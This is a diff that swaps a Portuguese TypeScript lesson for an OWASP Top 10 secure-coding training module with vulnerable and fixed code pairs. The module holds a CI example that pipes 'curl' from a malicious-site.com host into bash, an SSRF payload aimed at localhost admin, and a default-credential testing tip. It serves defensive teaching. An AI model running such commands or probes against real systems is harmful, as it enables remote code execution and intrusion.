+# 2. Testar mensagens de erro
+curl https://api.example.com/invalid-endpoint
+# Não deve expor stack trace ou caminhos de arquivo
 
-6. **Use const assertions para valores literais**
-   - **Por quê**: Preserva tipos literais ao invés de tipos amplos
-   - **Exemplo Bom**:
+# 3. Verificar configurações padrão
+# Tentar login com credenciais padrão conhecidas
 ```
-     const status = "pending" as const;
-     const colors = ["red", "green", "blue"] as const;
-     type Color = typeof colors[number];
-```
-   - **Benefícios**: Tipos mais precisos, melhor type checking
 
-7. **Use type guards para narrowing**
-   - **Por quê**: TypeScript pode inferir tipos mais específicos após verificações
-   - **Exemplo Bom**:
-```
-     function isUser(value: unknown): value is User {
-       return typeof value === "object" &&
-              value !== null &&
-              "id" in value &&
-              "name" in value;
-     }
-     
-     function process(value: unknown) {
-       if (isUser(value)) {
-         console.log(value.name);
-       }
-     }
-```
-   - **Benefícios**: Type narrowing seguro, código mais seguro
+#### Prevenção
 
-8. **Organize tipos em arquivos separados**
-   - **Por quê**: Facilita manutenção e reutilização
-   - **Exemplo Bom**:
-```
-     types/user.types.ts
-     export interface User { ... }
-     export type UserId = number;
-     
-     services/user.service.ts
-     import { User, UserId } from '../types/user.types';
-```
-   - **Benefícios**: Organização clara, fácil de encontrar tipos
-
-9. **Use readonly para imutabilidade**
-   - **Por quê**: Previne modificações acidentais
-   - **Exemplo Bom**:
-```
-     interface Config {
-       readonly apiUrl: string;
-       readonly timeout: number;
-     }
-     
-     const config: Config = {
-       apiUrl: "https://api.example.com",
-       timeout: 5000
-     };
-```
-   - **Benefícios**: Previne bugs, código mais seguro
-
-10. **Habilite strict mode no tsconfig.json**
-    - **Por quê**: Máxima type safety, detecta mais erros
-    - **Exemplo Bom**:
-```
-      {
-        "compilerOptions": {
-          "strict": true,
-          "noImplicitAny": true,
-          "strictNullChecks": true,
-          "strictFunctionTypes": true
-        }
-      }
-```
-    - **Benefícios**: Código mais seguro, menos bugs em runtime
-
-### ❌ Anti-padrões Comuns
-
-1. **Não use `any` desnecessariamente**
-   - **Problema**: Remove type safety completamente, permite qualquer operação
-   - **Exemplo Ruim**:
-```
-     function process(data: any): any {
-       return data.someProperty.anotherProperty.value;
-     }
-```
-   - **Solução**: Use tipos específicos ou `unknown` com type guards
-   - **Exemplo Correto**:
-```
-     function process(data: unknown): string {
-       if (typeof data === "object" && data !== null && "value" in data) {
-         return String(data.value);
-       }
-       throw new Error("Invalid data");
-     }
-```
-   - **Impacto**: Bugs em runtime, perda de autocomplete, código inseguro
-
-2. **Não ignore erros de tipo com `@ts-ignore`**
-   - **Problema**: Esconde problemas reais que devem ser corrigidos
-   - **Exemplo Ruim**:
-```
-     // @ts-ignore
-     const result = someFunction();
-```
-   - **Solução**: Corrija os tipos ou use type assertions quando necessário
-   - **Exemplo Correto**:
-```
-     const result = someFunction() as ExpectedType;
-```
-   - **Impacto**: Bugs escondidos, código frágil, dificulta manutenção
-
-3. **Não misture tipos em arrays sem union types**
-   - **Problema**: Dificulta manutenção e pode causar erros
-   - **Exemplo Ruim**:
-```
-     const items: any[] = [1, "text", { id: 1 }];
-```
-   - **Solução**: Use union types ou arrays tipados
-   - **Exemplo Correto**:
-```
-     const items: (string | number)[] = [1, "text", 2];
-     const users: User[] = [{ id: 1, name: "João" }];
-```
-   - **Impacto**: Erros em runtime, código difícil de entender
-
-4. **Não use type assertions sem necessidade**
-   - **Problema**: Bypassa verificação de tipos, pode causar erros
-   - **Exemplo Ruim**:
-```
-     const user = data as User;
-     console.log(user.name);
-```
-   - **Solução**: Use type guards ou validação
-   - **Exemplo Correto**:
-```
-     function isUser(data: unknown): data is User {
-       return typeof data === "object" &&
-              data !== null &&
-              "id" in data &&
-              "name" in data;
-     }
-     
-     if (isUser(data)) {
-       console.log(data.name);
-     }
-```
-   - **Impacto**: Erros em runtime, código inseguro
-
-5. **Não crie interfaces muito grandes**
-   - **Problema**: Dificulta manutenção e reutilização
-   - **Exemplo Ruim**:
-```
-     interface User {
-       id: number;
-       name: string;
-       email: string;
-       address: string;
-       city: string;
-       state: string;
-       zipCode: string;
-       phone: string;
-       preferences: object;
-       settings: object;
-     }
-```
-   - **Solução**: Divida em interfaces menores e componha
-   - **Exemplo Correto**:
-```
-     interface Address {
-       street: string;
-       city: string;
-       state: string;
-       zipCode: string;
-     }
-     
-     interface UserPreferences {
-       theme: string;
-       language: string;
-     }
-     
-     interface User {
-       id: number;
-       name: string;
-       email: string;
-       address: Address;
-       preferences: UserPreferences;
-     }
-```
-   - **Impacto**: Código difícil de manter, baixa reutilização
-
-6. **Não use tipos inline complexos repetidamente**
-   - **Problema**: Duplicação, difícil de manter
-   - **Exemplo Ruim**:
-```
-     function process(data: { id: number; name: string; email: string }): void {}
-     function validate(data: { id: number; name: string; email: string }): boolean {}
-```
-   - **Solução**: Extraia para interface ou type alias
-   - **Exemplo Correto**:
-```
-     interface UserData {
-       id: number;
-       name: string;
-       email: string;
-     }
-     
-     function process(data: UserData): void {}
-     function validate(data: UserData): boolean {}
-```
-   - **Impacto**: Duplicação de código, difícil refatoração
-
-7. **Não ignore null/undefined sem verificação**
-   - **Problema**: Pode causar erros em runtime
-   - **Exemplo Ruim**:
-```
-     function getName(user: User | null): string {
-       return user.name;
-     }
-```
-   - **Solução**: Use optional chaining ou verificação explícita
-   - **Exemplo Correto**:
-```
-     function getName(user: User | null): string {
-       return user?.name ?? "Unknown";
-     }
-```
-   - **Impacto**: Runtime errors, aplicação quebra
+**Boas Práticas**:
+1. **Remover configurações padrão**: Mudar todas as senhas/credenciais padrão
+2. **Hardening**: Desabilitar serviços e recursos desnecessários
+3. **Headers de Segurança**: Implementar CSP, HSTS, X-Frame-Options
+4. **Mensagens de Erro**: Mensagens genéricas em produção
+5. **Configuração por Ambiente**: Diferentes configurações para dev/staging/prod
 
 ---
 
-## Exercícios Práticos
+### 6. Vulnerable and Outdated Components
 
-### Exercício 1: Criar Interfaces e Tipos (Básico)
+#### 🎭 Analogia: A Biblioteca com Livros Antigos
 
-**Objetivo**: Criar interfaces para um sistema de produtos
+Imagine uma biblioteca que nunca atualiza seus livros.
 
-**Descrição**: 
-Crie interfaces para representar produtos em uma loja online. Cada produto deve ter id, nome, preço, descrição e categoria.
+**Cenário Seguro**:
+- Livros atualizados com correções ✅
+- Versões mais recentes ✅
 
-**Arquivo**: `exercises/exercise-1-2-1-interfaces-tipos.md`
+**Cenário Vulnerável**:
+- Livros antigos com erros conhecidos ❌
+- Versões desatualizadas ❌
+- Vulnerabilidades conhecidas não corrigidas ❌
+
+Na segurança de software, isso acontece quando bibliotecas e componentes têm vulnerabilidades conhecidas que não foram corrigidas.
+
+#### Definição Técnica
+
+**Vulnerable and Outdated Components** ocorre quando componentes (bibliotecas, frameworks, dependências) têm vulnerabilidades conhecidas que não foram atualizadas ou corrigidas.
+
+#### Exemplos Práticos
+
+**Exemplo: Dependência Vulnerável**
+
+```json
+// ❌ VULNERÁVEL - package.json com versão antiga
+{
+  "dependencies": {
+    "express": "4.16.0",  // Versão antiga com vulnerabilidades conhecidas
+    "lodash": "4.17.10"   // Versão antiga
+  }
+}
+```
+
+```json
+// ✅ SEGURO - Versões atualizadas e verificadas
+{
+  "dependencies": {
+    "express": "^4.18.2",  // Versão atualizada
+    "lodash": "^4.17.21"   // Versão atualizada
+  }
+}
+```
+
+**Ferramentas de Verificação**:
+- **npm audit**: Verifica vulnerabilidades em Node.js
+- **pip-audit**: Verifica vulnerabilidades em Python
+- **OWASP Dependency-Check**: Scanner genérico
+- **Snyk**: Scanner comercial
+- **Dependabot**: Atualizações automáticas (GitHub)
+
+#### Contexto CWI - Casos Reais
+
+**Caso Geral**:
+Em vários projetos CWI, implementamos verificação automática de dependências vulneráveis no pipeline CI/CD usando Snyk e Dependabot, prevenindo uso de bibliotecas com vulnerabilidades conhecidas.
+
+#### Como Testar
+
+**Checklist de Testes**:
+- [ ] Executar scanners de dependências regularmente
+- [ ] Verificar se há atualizações de segurança disponíveis
+- [ ] Validar se vulnerabilidades conhecidas foram corrigidas
+- [ ] Testar atualizações em ambiente de staging antes de produção
+
+#### Prevenção
+
+**Boas Práticas**:
+1. **Inventário de Dependências**: Manter lista atualizada de todas as dependências
+2. **Monitoramento Contínuo**: Usar ferramentas como Snyk, Dependabot
+3. **Atualizações Regulares**: Atualizar dependências regularmente
+4. **Testes de Regressão**: Testar após atualizações
+5. **Remoção de Dependências Não Usadas**: Reduzir superfície de ataque
 
 ---
 
-### Exercício 2: Implementar Classes com TypeScript (Básico)
+### 7. Identification and Authentication Failures
 
-**Objetivo**: Criar classes tipadas para gerenciar produtos
+#### 🎭 Analogia: O Porteiro que Não Verifica Identidade
 
-**Descrição**:
-Crie uma classe `ProductService` que gerencia uma lista de produtos usando TypeScript. Implemente métodos para adicionar, listar e buscar produtos.
+Imagine um porteiro que deixa qualquer um entrar sem verificar identidade.
 
-**Arquivo**: `exercises/exercise-1-2-2-classes-typescript.md`
+**Cenário Seguro**:
+- Verifica documento de identidade ✅
+- Confirma se pessoa está autorizada ✅
+
+**Cenário Vulnerável**:
+- Deixa qualquer um entrar ❌
+- Não verifica identidade ❌
+
+Na segurança de software, isso acontece quando autenticação e identificação são implementadas incorretamente.
+
+#### Definição Técnica
+
+**Identification and Authentication Failures** (anteriormente "Broken Authentication") ocorre quando funções de autenticação são implementadas incorretamente, permitindo que atacantes comprometam senhas, tokens de sessão ou explorem falhas de implementação.
+
+#### Tipos de Falhas
+
+| Tipo | Descrição | Impacto |
+|------|-----------|---------|
+| **Senhas fracas** | Permite senhas simples | Alto - Ataques de força bruta |
+| **Sessões não invalidadas** | Sessões permanecem válidas após logout | Alto - Ataques de sessão |
+| **Credenciais expostas** | Tokens/senhas em logs ou URLs | Crítico - Acesso não autorizado |
+| **Falta de MFA** | Apenas senha, sem 2FA | Médio - Vulnerável a phishing |
+| **Força bruta não limitada** | Tentativas ilimitadas de login | Alto - Quebra de senhas |
+
+#### Exemplos Práticos
+
+**Exemplo 1: Sessões Não Invalidadas**
+
+```python
+# ❌ VULNERÁVEL - Sessão não invalidada no logout
+@app.route('/api/logout', methods=['POST'])
+def logout():
+    session.clear()  # Limpa sessão local, mas token ainda válido!
+    return {'success': True}
+
+# Token ainda pode ser usado até expirar!
+```
+
+```python
+# ✅ SEGURO - Invalidação completa de sessão
+from datetime import datetime
+
+# Tabela de tokens invalidados
+blacklisted_tokens = set()
+
+@app.route('/api/logout', methods=['POST'])
+@require_auth
+def logout():
+    token = request.headers.get('Authorization').split(' ')[1]
+    
+    # Adiciona token à blacklist
+    blacklisted_tokens.add(token)
+    
+    # Também invalida no banco de dados
+    db.invalidate_session(session['session_id'])
+    
+    session.clear()
+    return {'success': True}
+
+@app.before_request
+def check_token():
+    token = request.headers.get('Authorization')
+    if token and token.split(' ')[1] in blacklisted_tokens:
+        return {'error': 'Token invalidated'}, 401
+```
+
+**Exemplo 2: Senhas Fracas Permitidas**
+
+```python
+# ❌ VULNERÁVEL - Aceita qualquer senha
+def validate_password(password):
+    return len(password) >= 4  # Muito fraco!
+
+# Permite senhas como "1234", "pass", etc.
+```
+
+```python
+# ✅ SEGURO - Validação forte de senha
+import re
+
+def validate_password(password):
+    if len(password) < 12:
+        return False, "Password must be at least 12 characters"
+    
+    if not re.search(r'[A-Z]', password):
+        return False, "Password must contain uppercase letter"
+    
+    if not re.search(r'[a-z]', password):
+        return False, "Password must contain lowercase letter"
+    
+    if not re.search(r'[0-9]', password):
+        return False, "Password must contain number"
+    
+    if not re.search(r'[!@#$%^&*]', password):
+        return False, "Password must contain special character"
+    
+    # Verifica senhas comuns
+    common_passwords = ['password', '123456', 'qwerty']
+    if password.lower() in common_passwords:
+        return False, "Password is too common"
+    
+    return True, "Password is valid"
+```
+
+#### Contexto CWI - Casos Reais
+
+**Caso Financeiro**:
+Em projetos financeiros da CWI, implementamos autenticação forte com MFA obrigatório e rate limiting rigoroso para prevenir ataques de força bruta.
+
+#### Como Testar
+
+**Checklist de Testes**:
+- [ ] Testar força bruta (deve ter rate limiting)
+- [ ] Verificar se sessões são invalidadas no logout
+- [ ] Validar política de senhas (complexidade mínima)
+- [ ] Testar se tokens não aparecem em URLs ou logs
+- [ ] Verificar se MFA está implementado quando necessário
+
+#### Prevenção
+
+**Boas Práticas**:
+1. **Senhas Fortes**: Política de senhas com complexidade adequada
+2. **MFA**: Implementar autenticação de dois fatores quando possível
+3. **Rate Limiting**: Limitar tentativas de login
+4. **Gerenciamento de Sessão**: Invalidar sessões adequadamente
+5. **Proteção de Credenciais**: Nunca expor em URLs ou logs
 
 ---
 
-### Exercício 3: Usar Generics (Intermediário)
+### 8. Software and Data Integrity Failures
 
-**Objetivo**: Criar funções genéricas reutilizáveis
+#### Definição Técnica
 
-**Descrição**:
-Crie funções genéricas para operações comuns: `getById`, `filter`, `map`. Essas funções devem funcionar com qualquer tipo que tenha uma propriedade `id`.
+**Software and Data Integrity Failures** ocorre quando software e dados críticos não são protegidos contra modificação não autorizada. Isso inclui falhas em CI/CD, atualizações não verificadas, e dados não protegidos contra alteração.
 
-**Arquivo**: `exercises/exercise-1-2-3-generics.md`
+#### Exemplos Práticos
+
+**Exemplo: CI/CD Não Verificado**
+
+```yaml
+# ❌ VULNERÁVEL - CI/CD sem verificação de integridade
+# .github/workflows/deploy.yml
+- name: Deploy
+  run: |
+    curl https://malicious-site.com/script.sh | bash
+    # Executa script sem verificar assinatura!
+```
+
+```yaml
+# ✅ SEGURO - Verificação de assinatura
+- name: Deploy
+  run: |
+    # Verifica assinatura antes de executar
+    gpg --verify script.sh.sig script.sh
+    bash script.sh
+```
+
+#### Prevenção
+
+**Boas Práticas**:
+1. **Assinatura de Código**: Verificar assinaturas de binários e scripts
+2. **CI/CD Seguro**: Verificar integridade de pipelines
+3. **Verificação de Dados**: Validar integridade de dados críticos
+4. **Backups Seguros**: Proteger backups contra modificação
 
 ---
 
-### Exercício 4: Organizar com Módulos ES6 (Intermediário)
+### 9. Security Logging and Monitoring Failures
 
-**Objetivo**: Organizar código em módulos separados
+#### Definição Técnica
 
-**Descrição**:
-Separe seu código em módulos: `types.ts` (interfaces e tipos), `services.ts` (serviços), `utils.ts` (funções utilitárias). Importe e use em um arquivo principal.
+**Security Logging and Monitoring Failures** ocorre quando falhas de segurança não são detectadas adequadamente devido a logging ou monitoramento insuficiente.
 
-**Arquivo**: `exercises/exercise-1-2-4-modulos-es6.md`
+#### Exemplos Práticos
+
+**Exemplo: Logging Inadequado**
+
+```python
+# ❌ VULNERÁVEL - Sem logging de segurança
+@app.route('/api/login', methods=['POST'])
+def login():
+    username = request.json['username']
+    password = request.json['password']
+    
+    user = authenticate(username, password)
+    if user:
+        return {'token': generate_token(user)}
+    else:
+        return {'error': 'Invalid credentials'}, 401
+    # Não registra tentativas de login falhadas!
+```
+
+```python
+# ✅ SEGURO - Logging completo de segurança
+import logging
+
+security_logger = logging.getLogger('security')
+
+@app.route('/api/login', methods=['POST'])
+def login():
+    username = request.json['username']
+    password = request.json['password']
+    ip_address = request.remote_addr
+    
+    user = authenticate(username, password)
+    if user:
+        security_logger.info(f"Successful login: {username} from {ip_address}")
+        return {'token': generate_token(user)}
+    else:
+        # Log de tentativa falhada
+        security_logger.warning(f"Failed login attempt: {username} from {ip_address}")
+        return {'error': 'Invalid credentials'}, 401
+```
+
+#### Prevenção
+
+**Boas Práticas**:
+1. **Logging Completo**: Registrar eventos de segurança importantes
+2. **Monitoramento em Tempo Real**: Alertas para atividades suspeitas
+3. **Análise de Logs**: Ferramentas de SIEM para análise
+4. **Retenção de Logs**: Manter logs por período adequado
 
 ---
 
-### Exercício 5: Integração TypeScript + Angular (Avançado)
+### 10. Server-Side Request Forgery (SSRF)
 
-**Objetivo**: Criar componente Angular tipado corretamente
+#### 🎭 Analogia: O Mensageiro Enganado
 
-**Descrição**:
-Crie um componente Angular que usa todas as práticas TypeScript aprendidas: interfaces para dados, classes tipadas, generics em serviços, e imports/exports organizados.
+Imagine um mensageiro que vai buscar encomendas baseado em endereços que você fornece.
 
-**Arquivo**: `exercises/exercise-1-2-5-integracao-angular.md`
+**Cenário Normal**:
+- Você pede: "Busque na loja da rua X"
+- Mensageiro vai e busca ✅
+
+**Cenário de Ataque (SSRF)**:
+- Você pede: "Busque em localhost:8080/admin"
+- Mensageiro vai e acessa servidor interno ❌
+- Dados internos são expostos ❌
+
+#### Definição Técnica
+
+**Server-Side Request Forgery (SSRF)** ocorre quando um servidor web faz requisições HTTP para URLs fornecidas pelo cliente sem validação adequada, permitindo que atacantes façam o servidor acessar recursos internos ou externos não autorizados.
+
+#### Exemplos Práticos
+
+**Exemplo: SSRF em Funcionalidade de Preview**
+
+```python
+# ❌ VULNERÁVEL - SSRF possível
+import requests
+
+@app.route('/api/preview', methods=['POST'])
+def preview_url():
+    url = request.json['url']
+    
+    # Faz requisição sem validação
+    response = requests.get(url)
+    return response.text
+
+# Ataque possível:
+# POST /api/preview
+# {"url": "http://localhost:8080/admin"}
+# Resultado: Acessa recursos internos!
+```
+
+```python
+# ✅ SEGURO - Validação de URL
+import requests
+from urllib.parse import urlparse
+
+def is_internal_url(url):
+    """Verifica se URL é interna (localhost, IPs privados)"""
+    parsed = urlparse(url)
+    hostname = parsed.hostname
+    
+    # Bloqueia localhost
+    if hostname in ['localhost', '127.0.0.1', '0.0.0.0']:
+        return True
+    
+    # Bloqueia IPs privados
+    if hostname.startswith('10.') or hostname.startswith('192.168.'):
+        return True
+    
+    return False
+
+@app.route('/api/preview', methods=['POST'])
+def preview_url():
+    url = request.json['url']
+    
+    # Validação
+    if is_internal_url(url):
+        return {'error': 'Invalid URL'}, 400
+    
+    # Whitelist de domínios permitidos
+    allowed_domains = ['example.com', 'trusted-site.com']
+    parsed = urlparse(url)
+    if parsed.hostname not in allowed_domains:
+        return {'error': 'Domain not allowed'}, 400
+    
+    response = requests.get(url, timeout=5)
+    return response.text
+```
+
+#### Prevenção
+
+**Boas Práticas**:
+1. **Validação de URL**: Validar e sanitizar URLs fornecidas
+2. **Whitelist de Domínios**: Permitir apenas domínios conhecidos
+3. **Bloquear IPs Internos**: Não permitir acesso a localhost/IPs privados
+4. **Network Segmentation**: Isolar recursos internos da rede pública
 
 ---
 
-## Referências Externas
+## 💼 Aplicação por Setor CWI
+
+### Tabela Comparativa: Priorização de Vulnerabilidades por Setor
+
+| Vulnerabilidade | Financeiro | Educacional | Ecommerce | Criticidade Geral |
+|----------------|------------|-------------|-----------|------------------|
+| **Broken Access Control** | 🔴 CRÍTICA | 🔴 CRÍTICA | 🔴 CRÍTICA | Acesso a contas/dados |
+| **Cryptographic Failures** | 🔴 CRÍTICA | 🔴 CRÍTICA | 🔴 CRÍTICA | Dados sensíveis expostos |
+| **Injection** | 🔴 CRÍTICA | 🟠 ALTA | 🔴 CRÍTICA | Vazamento de dados |
+| **Insecure Design** | 🔴 CRÍTICA | 🟠 ALTA | 🔴 CRÍTICA | Fraudes e abusos |
+| **Security Misconfiguration** | 🟠 ALTA | 🟠 ALTA | 🟠 ALTA | Superfície de ataque |
+| **Vulnerable Components** | 🟠 ALTA | 🟡 MÉDIA | 🟠 ALTA | Exploits conhecidos |
+| **Auth Failures** | 🔴 CRÍTICA | 🟠 ALTA | 🔴 CRÍTICA | Acesso não autorizado |
+| **Data Integrity** | 🔴 CRÍTICA | 🟡 MÉDIA | 🟠 ALTA | Modificação de dados |
+| **Logging Failures** | 🟠 ALTA | 🟡 MÉDIA | 🟠 ALTA | Detecção de ataques |
+| **SSRF** | 🟠 ALTA | 🟡 MÉDIA | 🟡 MÉDIA | Acesso a recursos internos |
+
+**Legenda**: 🔴 Crítica | 🟠 Alta | 🟡 Média
+
+### Contexto Específico por Setor
+
+#### Financeiro (Fintech, Open Banking)
+- **Foco Principal**: Broken Access Control, Cryptographic Failures, Injection
+- **Compliance**: PCI-DSS exige proteção rigorosa de dados de cartão
+- **Casos CWI**: Implementação de validação rigorosa de acesso em APIs de Open Banking
+
+#### Educacional (EdTech)
+- **Foco Principal**: Broken Access Control (dados de menores), Cryptographic Failures
+- **Compliance**: LGPD com requisitos especiais para dados de menores
+- **Casos CWI**: Isolamento rigoroso de dados entre alunos e turmas
+
+#### Ecommerce
+- **Foco Principal**: Injection, Broken Access Control, Auth Failures
+- **Riscos**: Fraudes, acesso a dados de pagamento, manipulação de preços
+- **Casos CWI**: Validação de regras de negócio para prevenir fraudes
+
+---
+
+## 🧪 Laboratório Prático
+
+### Setup do Ambiente
+
+#### Opção 1: OWASP WebGoat
+```bash
+# Instalar Docker
+# Executar WebGoat
+docker run -d -p 8080:8080 webgoat/goatandwolf
+
+# Acessar: http://localhost:8080
+# Login: guest / guest
+```
+
+#### Opção 2: OWASP Juice Shop
+```bash
+# Executar Juice Shop
+docker run -d -p 3000:3000 bkimminich/juice-shop
+
+# Acessar: http://localhost:3000
+```
+
+### Exercícios Práticos
+
+#### Exercício 1: Identificar SQL Injection
+1. Acesse OWASP WebGoat
+2. Navegue até "Injection" → "SQL Injection (Intro)"
+3. Tente injetar SQL em campos de entrada
+4. Identifique qual campo é vulnerável
+5. Documente o payload usado
+
+#### Exercício 2: Explorar Broken Access Control
+1. Acesse OWASP Juice Shop
+2. Faça login como usuário comum
+3. Tente acessar recursos administrativos
+4. Identifique vulnerabilidades de acesso
+5. Documente como corrigir
+
+---
+
+## 📊 Tabela de Referência Rápida
+
+| # | Vulnerabilidade | Como Identificar | Como Prevenir | Ferramentas |
+|---|----------------|------------------|---------------|-------------|
+| 1 | Broken Access Control | Testar acesso direto a objetos | Validação de propriedade | Burp Suite, OWASP ZAP |
+| 2 | Cryptographic Failures | Verificar hash de senhas, HTTPS | Hash seguro, HTTPS obrigatório | SSL Labs, Hash Analyzer |
+| 3 | Injection | Tentar payloads de injection | Prepared statements | SQLMap, NoSQLMap |
+| 4 | Insecure Design | Análise de arquitetura | Threat modeling | Microsoft TMT |
+| 5 | Security Misconfiguration | Verificar headers, configurações | Hardening checklist | Security Headers |
+| 6 | Vulnerable Components | Scanner de dependências | Atualizações regulares | Snyk, Dependabot |
+| 7 | Auth Failures | Testar força bruta | Rate limiting, MFA | Burp Suite Intruder |
+| 8 | Data Integrity | Verificar assinaturas | Validação de integridade | GPG, Code signing |
+| 9 | Logging Failures | Verificar logs | Logging completo | ELK Stack, Splunk |
+| 10 | SSRF | Testar URLs internas | Validação de URL | Burp Suite Collaborator |
+
+---
+
+## ✅ Checklist de Testes por Vulnerabilidade
+
+### Broken Access Control
+- [ ] Tentar acessar recursos de outros usuários
+- [ ] Testar endpoints administrativos sem ser admin
+- [ ] Verificar validação de propriedade
+- [ ] Testar navegação forçada
+
+### Cryptographic Failures
+- [ ] Verificar hash de senhas (não texto plano)
+- [ ] Confirmar HTTPS em todas as conexões
+- [ ] Validar algoritmos de criptografia
+- [ ] Verificar gerenciamento de chaves
+
+### Injection
+- [ ] Testar SQL Injection em todos os campos
+- [ ] Tentar NoSQL Injection
+- [ ] Testar Command Injection
+- [ ] Validar uso de prepared statements
+
+### Insecure Design
+- [ ] Verificar rate limiting
+- [ ] Testar validação de regras de negócio
+- [ ] Validar isolamento de recursos
+- [ ] Verificar autenticação forte
+
+### Security Misconfiguration
+- [ ] Verificar headers de segurança
+- [ ] Testar mensagens de erro
+- [ ] Validar configurações padrão
+- [ ] Verificar serviços desnecessários
+
+---
+
+## 🔗 Referências Externas Validadas
 
 ### Documentação Oficial
+- [OWASP Top 10 - 2021](https://owasp.org/Top10/) - Documentação oficial completa
+- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) - Guia de testes
+- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/) - Cheat sheets por tópico
 
-#### TypeScript Core
+### Ferramentas
+- [OWASP ZAP](https://www.zaproxy.org/) - Scanner de vulnerabilidades
+- [Burp Suite](https://portswigger.net/burp) - Ferramenta de teste de segurança
+- [SQLMap](https://sqlmap.org/) - Ferramenta de teste de SQL Injection
+- [Snyk](https://snyk.io/) - Scanner de dependências vulneráveis
 
-- **[TypeScript Handbook](https://www.typescriptlang.org/docs/handbook/intro.html)**: Guia completo e oficial do TypeScript, cobrindo todos os aspectos da linguagem
-- **[TypeScript Release Notes](https://www.typescriptlang.org/docs/handbook/release-notes/overview.html)**: Histórico de releases e novas features
-- **[TypeScript Compiler Options](https://www.typescriptlang.org/tsconfig)**: Referência completa de todas as opções do compilador
-- **[TypeScript FAQ](https://www.typescriptlang.org/docs/handbook/declaration-files/do-s-and-don-ts.html)**: Perguntas frequentes e boas práticas
-
-#### TypeScript Advanced Topics
-
-- **[TypeScript Advanced Types](https://www.typescriptlang.org/docs/handbook/2/types-from-types.html)**: Tipos avançados e utility types
-- **[TypeScript Generics](https://www.typescriptlang.org/docs/handbook/2/generics.html)**: Guia completo sobre generics
-- **[TypeScript Decorators](https://www.typescriptlang.org/docs/handbook/decorators.html)**: Documentação sobre decorators
-- **[TypeScript Modules](https://www.typescriptlang.org/docs/handbook/modules.html)**: Sistema de módulos do TypeScript
-
-#### Angular + TypeScript
-
-- **[TypeScript Configuration for Angular](https://angular.io/guide/typescript-configuration)**: Como configurar TypeScript em projetos Angular
-- **[Angular TypeScript Style Guide](https://angular.io/guide/styleguide)**: Guia de estilo TypeScript para Angular
+### Laboratórios Práticos
+- [OWASP WebGoat](https://owasp.org/www-project-webgoat/) - Aplicação vulnerável para prática
+- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/) - Aplicação vulnerável moderna
+- [DVWA](http://www.dvwa.co.uk/) - Damn Vulnerable Web Application
 
 ### Artigos e Tutoriais
-
-#### Guias Completos
-
-- **[TypeScript Deep Dive](https://basarat.gitbook.io/typescript/)**: Guia aprofundado e detalhado de TypeScript, cobrindo conceitos avançados
-- **[TypeScript for JavaScript Programmers](https://www.typescriptlang.org/docs/handbook/typescript-in-5-minutes.html)**: Introdução rápida para desenvolvedores JavaScript
-
-#### Artigos Técnicos
-
-- **[Understanding TypeScript's Type System](https://www.typescriptlang.org/docs/handbook/2/everyday-types.html)**: Entendendo o sistema de tipos do TypeScript
-- **[TypeScript Best Practices](https://www.typescriptlang.org/docs/handbook/declaration-files/do-s-and-don-ts.html)**: Melhores práticas e padrões
-- **[TypeScript Design Goals](https://github.com/Microsoft/TypeScript/wiki/TypeScript-Design-Goals)**: Objetivos de design do TypeScript
-
-#### Tutoriais Específicos
-
-- **[TypeScript Generics Tutorial](https://www.typescriptlang.org/docs/handbook/2/generics.html)**: Tutorial detalhado sobre generics
-- **[TypeScript Interfaces vs Types](https://www.typescriptlang.org/docs/handbook/2/everyday-types.html#differences-between-type-aliases-and-interfaces)**: Diferenças entre interfaces e type aliases
-- **[TypeScript Utility Types](https://www.typescriptlang.org/docs/handbook/utility-types.html)**: Guia sobre utility types (Partial, Pick, Omit, etc.)
-
-### Vídeos e Cursos
-
-#### Canais Recomendados
-
-- **[TypeScript Official Channel](https://www.youtube.com/c/TypeScript)**: Canal oficial do TypeScript com atualizações e tutoriais
-- **[Angular University - TypeScript](https://www.youtube.com/results?search_query=angular+university+typescript)**: Tutoriais TypeScript focados em Angular
-
-#### Playlists
-
-- **TypeScript Fundamentals**: Cursos introdutórios sobre TypeScript
-- **Advanced TypeScript**: Conceitos avançados e patterns
-
-### Ferramentas e Recursos
-
-#### IDEs e Editores
-
-- **[VS Code TypeScript Support](https://code.visualstudio.com/docs/languages/typescript)**: Suporte TypeScript no VS Code
-- **[WebStorm TypeScript](https://www.jetbrains.com/help/webstorm/typescript-support.html)**: Suporte TypeScript no WebStorm
-
-#### Ferramentas Online
-
-- **[TypeScript Playground](https://www.typescriptlang.org/play)**: Experimente TypeScript online sem instalação
-- **[TypeScript AST Viewer](https://ts-ast-viewer.com/)**: Visualize a Abstract Syntax Tree do TypeScript
-- **[TypeScript Error Translator](https://ts-error-translator.vercel.app/)**: Traduz erros do TypeScript para linguagem mais amigável
-
-#### Ferramentas de Build
-
-- **[ts-node](https://github.com/TypeStrong/ts-node)**: Execute TypeScript diretamente sem compilar
-- **[tsx](https://github.com/esbuild-kit/tsx)**: Executor TypeScript rápido usando esbuild
-
-### Comunidade e Suporte
-
-#### Fóruns e Comunidades
-
-- **[TypeScript GitHub](https://github.com/microsoft/TypeScript)**: Repositório oficial e issues
-- **[Stack Overflow - TypeScript](https://stackoverflow.com/questions/tagged/typescript)**: Perguntas e respostas da comunidade
-- **[TypeScript Discord](https://discord.gg/typescript)**: Comunidade Discord do TypeScript
-- **[r/typescript](https://www.reddit.com/r/typescript/)**: Subreddit do TypeScript
-
-#### Newsletters e Blogs
-
-- **[TypeScript Weekly](https://typescript-weekly.com/)**: Newsletter semanal sobre TypeScript
-- **[TypeScript Blog](https://devblogs.microsoft.com/typescript/)**: Blog oficial da equipe TypeScript
-
-### Livros Recomendados
-
-- **"Programming TypeScript"** por Boris Cherny: Guia completo sobre TypeScript
-- **"Effective TypeScript"** por Dan Vanderkam: 62 maneiras específicas de melhorar seu TypeScript
-- **"TypeScript in 50 Lessons"** por Stefan Baumgartner: Aprenda TypeScript através de lições práticas
-
-### Cheat Sheets
-
-- **[TypeScript Cheat Sheet](https://www.typescriptlang.org/cheatsheets)**: Referência rápida oficial
-- **[TypeScript Utility Types Cheat Sheet](https://www.typescriptlang.org/docs/handbook/utility-types.html)**: Referência de utility types
+- [OWASP Top 10 Explained](https://owasp.org/www-project-top-ten/) - Explicações detalhadas
+- [PortSwigger Web Security Academy](https://portswigger.net/web-security) - Tutoriais práticos
 
 ---
 
-## Resumo
+## 🎯 Próximos Passos
 
-### Principais Conceitos
+Após dominar o OWASP Top 10, você estará preparado para:
 
-- **TypeScript**: Linguagem que adiciona type safety estático ao JavaScript, verificando tipos em compile-time
